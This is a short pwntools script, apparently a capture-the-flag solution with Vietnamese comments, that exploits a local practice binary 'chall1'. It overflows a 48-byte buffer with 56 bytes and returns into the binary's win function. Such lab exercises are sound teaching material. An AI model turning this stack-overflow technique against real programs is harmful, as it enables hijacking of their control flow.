#!/usr/bin/env python3
# Challenge 1 (de): ret2win khong tham so. Offset do bang cyclic = 56 (buf[48] + 8).
# win dung syscall nen nhay thang vao, khong vuong movaps.
from pwn import *

context.binary = elf = ELF('./chall1', checksec=False)
context.log_level = 'info'

io = process('./chall1')
io.sendafter(b'chall1>\n', flat(b'A' * 56, elf.sym['win']))
print(io.recvall(timeout=2).decode(errors='replace'))
